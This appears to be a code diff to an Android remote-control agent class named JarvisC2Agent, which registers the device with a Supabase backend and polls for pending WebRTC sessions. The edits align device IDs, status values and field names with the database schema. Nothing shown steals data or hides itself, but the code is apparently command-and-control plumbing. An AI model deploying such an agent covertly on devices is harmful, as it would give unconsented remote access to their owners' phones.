@@ -50,14 +50,22 @@ class JarvisC2Agent(private val context: Context) {
         .writeTimeout(15, TimeUnit.SECONDS)
         .build()
 
-    /** Unique, stable device ID */
+    /** Unique, stable device ID — UUID that matches the DB column type */
     private val deviceId: String by lazy {
-        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
-            ?: UUID.randomUUID().toString()
+        // Use a UUID so it matches the UUID column type in Supabase
+        val stored = context.getSharedPreferences("jarvis_prefs", Context.MODE_PRIVATE)
+            .getString("device_uuid", null)
+        if (stored != null) stored else {
+            val uuid = UUID.randomUUID().toString()
+            context.getSharedPreferences("jarvis_prefs", Context.MODE_PRIVATE)
+                .edit().putString("device_uuid", uuid).apply()
+            uuid
+        }
     }
 
     private val deviceName: String get() = "${Build.MANUFACTURER} ${Build.MODEL}"
-    private val osVersion: String  get() = "Android ${Build.VERSION.RELEASE}"
+    private val androidVersion: String  get() = "Android ${Build.VERSION.RELEASE}"
+    private val apiLevel: Int get() = Build.VERSION.SDK_INT
 
     // ──────────────────────────────────────────────────────────────────────────
     //  Public API
@@ -89,10 +97,13 @@ class JarvisC2Agent(private val context: Context) {
 
     private suspend fun registerOrUpdateDevice() {
         val body = JSONObject().apply {
-            put("device_id",   deviceId)
-            put("device_name", deviceName)
-            put("os_version",  osVersion)
-            put("is_online",   true)
+            put("device_id",       deviceId)
+            put("device_name",     deviceName)
+            put("manufacturer",    Build.MANUFACTURER)
+            put("model",           Build.MODEL)
+            put("android_version", androidVersion)
+            put("api_level",       apiLevel)
+            put("status",          "Online")
         }.toString()
 
         val request = Request.Builder()
@@ -117,7 +128,7 @@ class JarvisC2Agent(private val context: Context) {
     private suspend fun pollForSession() {
         // Query for a pending session targeting this device
         val request = Request.Builder()
-            .url("$SUPABASE_URL/jarvis_sessions?device_id=eq.$deviceId&status=eq.pending&limit=1")
+            .url("$SUPABASE_URL/jarvis_sessions?device_id=eq.$deviceId&status=eq.Pending&limit=1")
             .headers(supabaseHeaders())
             .get()
             .build()
@@ -132,7 +143,7 @@ class JarvisC2Agent(private val context: Context) {
             if (arr.length() == 0) return
 
             val session = arr.getJSONObject(0)
-            val sessionId = session.getString("id")
+            val sessionId = session.getString("session_id")
             val offerSdp  = session.optString("offer_sdp", "")
 
             Log.d(TAG, "Found pending session: $sessionId")
@@ -170,7 +181,7 @@ class JarvisC2Agent(private val context: Context) {
         }.toString()
 
         val request = Request.Builder()
-            .url("$SUPABASE_URL/jarvis_sessions?id=eq.$sessionId")
+            .url("$SUPABASE_URL/jarvis_sessions?session_id=eq.$sessionId")
             .headers(supabaseHeaders())
             .patch(body.toRequestBody("application/json".toMediaType()))
             .build()
